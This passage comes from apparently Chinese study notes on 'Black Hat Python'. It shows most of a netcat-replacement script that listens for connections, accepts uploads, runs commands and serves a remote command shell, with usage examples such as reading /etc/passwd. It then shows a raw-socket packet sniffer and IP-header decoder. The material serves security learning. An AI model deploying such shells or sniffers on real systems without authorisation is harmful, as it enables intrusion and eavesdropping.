</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>client_socket</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>file_buffer</span> <span class=o>+=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># now we take these bytes and try to write them out</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>file_descriptor</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>upload_destination</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>file_descriptor</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>file_buffer</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>file_descriptor</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># acknowledge that we wrote the file out</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;Successfully saved file to </span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>upload_destination</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;Failed to save file to </span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>upload_destination</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># check for command execution</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>execute</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># run the command</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>run_command</span><span class=p>(</span><span class=n>execute</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># now we go into another loop if a command shell was requested</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>command</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># show a simple prompt</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;&lt;BHP:#&gt; &#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># now we receive until we see a linefeed (enter key)</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd_buffer</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>cmd_buffer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>cmd_buffer</span> <span class=o>+=</span> <span class=n>client_socket</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># we have a valid command so execute it and send back the results</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>run_command</span><span class=p>(</span><span class=n>cmd_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send back the response</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># this is for incoming connections</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>server_loop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>target</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># if no target is defined we listen on all interfaces</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;0.0.0.0&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>target</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>client_socket</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># spin off a thread to handle our new client</span>
</span></span><span class=line><span class=cl>        <span class=n>client_thread</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>client_handler</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                         <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>client_socket</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>        <span class=n>client_thread</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we don&#39;t listen we are a client... make it so.</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>client_sender</span><span class=p>(</span><span class=n>buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># connect to our target host</span>
</span></span><span class=line><span class=cl>        <span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>target</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if we detect input from stdin send it</span>
</span></span><span class=line><span class=cl>        <span class=c1># if not we are going to wait for the user to punch some in</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buffer</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># now wait for data back</span>
</span></span><span class=line><span class=cl>            <span class=n>recv_len</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>recv_len</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>recv_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>+=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>recv_len</span> <span class=o>&lt;</span> <span class=mi>4096</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># wait for more input</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send it off</span>
</span></span><span class=line><span class=cl>            <span class=n>client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buffer</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>socket</span><span class=o>.</span><span class=n>error</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># just catch generic errors - you can do your homework to beef this up</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Exception! Exiting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Caught exception socket.error: </span><span class=si>{</span><span class=n>exc</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># teardown the connection</span>
</span></span><span class=line><span class=cl>        <span class=n>client</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>usage</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Netcat Replacement&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: bhpnet.py -t target_host -p port&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-l --listen                - listen on [host]:[port] for incoming &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;connections&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-e --execute=file_to_run   - execute the given file upon receiving &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;a connection&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;-c --command               - initialize a command shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;-u --upload=destination    - upon receiving connection upload a file &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;and write to [destination]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Examples: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -c&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:</span><span class=se>\\</span><span class=s2>target.exe&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=</span><span class=se>\&#34;</span><span class=s2>cat /etc/passwd</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;echo &#39;ABCDEFGHI&#39; | ./bhpnet.py -t 192.168.11.12 -p 135&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>listen</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>port</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>execute</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>command</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>upload_destination</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>target</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:]):</span>
</span></span><span class=line><span class=cl>        <span class=n>usage</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># read the commandline options</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>opts</span><span class=p>,</span> <span class=n>args</span> <span class=o>=</span> <span class=n>getopt</span><span class=o>.</span><span class=n>getopt</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:],</span> <span class=s2>&#34;hle:t:p:cu:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=p>[</span><span class=s2>&#34;help&#34;</span><span class=p>,</span> <span class=s2>&#34;listen&#34;</span><span class=p>,</span> <span class=s2>&#34;execute&#34;</span><span class=p>,</span> <span class=s2>&#34;target&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                    <span class=s2>&#34;port&#34;</span><span class=p>,</span> <span class=s2>&#34;command&#34;</span><span class=p>,</span> <span class=s2>&#34;upload&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>o</span><span class=p>,</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>opts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-h&#34;</span><span class=p>,</span> <span class=s2>&#34;--help&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>usage</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-l&#34;</span><span class=p>,</span> <span class=s2>&#34;--listen&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>listen</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-e&#34;</span><span class=p>,</span> <span class=s2>&#34;--execute&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>execute</span> <span class=o>=</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;--commandshell&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>command</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-u&#34;</span><span class=p>,</span> <span class=s2>&#34;--upload&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>upload_destination</span> <span class=o>=</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-t&#34;</span><span class=p>,</span> <span class=s2>&#34;--target&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>target</span> <span class=o>=</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>o</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-p&#34;</span><span class=p>,</span> <span class=s2>&#34;--port&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>assert</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;Unhandled Option&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>getopt</span><span class=o>.</span><span class=n>GetoptError</span> <span class=k>as</span> <span class=n>err</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>err</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>usage</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># are we going to listen or just send data from STDIN?</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>listen</span> <span class=ow>and</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>)</span> <span class=ow>and</span> <span class=n>port</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># read in the buffer from the commandline</span>
</span></span><span class=line><span class=cl>        <span class=c1># this will block, so send CTRL-D if not sending input</span>
</span></span><span class=line><span class=cl>        <span class=c1># to stdin</span>
</span></span><span class=line><span class=cl>        <span class=n>buffer</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># send data off</span>
</span></span><span class=line><span class=cl>        <span class=n>client_sender</span><span class=p>(</span><span class=n>buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># we are going to listen and potentially</span>
</span></span><span class=line><span class=cl>    <span class=c1># upload things, execute commands and drop a shell back</span>
</span></span><span class=line><span class=cl>    <span class=c1># depending on our command line options above</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>listen</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>server_loop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>就是proxy + run_command + server + client的集大成(不包含SSH)
作為netcat(nc)的替代品</p><h2 id=ch3>CH3<a hidden class=anchor aria-hidden=true href=#ch3>#</a></h2><p>這章就是介紹raw socket，沒有第四層的socket</p><p>sniffer_basic.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host to listen on</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;192.168.0.196&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create a raw socket and bind it to the public interface</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_ICMP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_RAW</span><span class=p>,</span> <span class=n>socket_protocol</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=c1># 沒有第四層，就不用port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># we want the IP headers included in the capture</span>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>IP_HDRINCL</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we&#39;re on Windows we need to send an IOCTL</span>
</span></span><span class=line><span class=cl><span class=c1># to setup promiscuous mode</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>    <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_ON</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># read in a single packet</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sniffer</span><span class=o>.</span><span class=n>recvfrom</span><span class=p>(</span><span class=mi>65535</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we&#39;re on Windows turn off promiscuous mode</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_OFF</span><span class=p>)</span>
</span></span></code></pre></div><p>設定一個socket接收所有packet，但收到的資料都是byte，要依據protocol的規定轉成對應的datatype</p><hr><p>sniffer_ip_header_decode.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host to listen on</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;192.168.0.187&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IP</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ihl&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;version&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;tos&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;len&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;id&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;offset&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ttl&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;protocol_num&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;sum&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;src&#34;</span><span class=p>,</span> <span class=n>c_uint32</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;dst&#34;</span><span class=p>,</span> <span class=n>c_uint32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__new__</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>cls</span><span class=o>.</span><span class=n>from_buffer_copy</span><span class=p>(</span><span class=n>socket_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>socket_buffer</span> <span class=o>=</span> <span class=n>socket_buffer</span>
</span></span><span class=line><span class=cl>
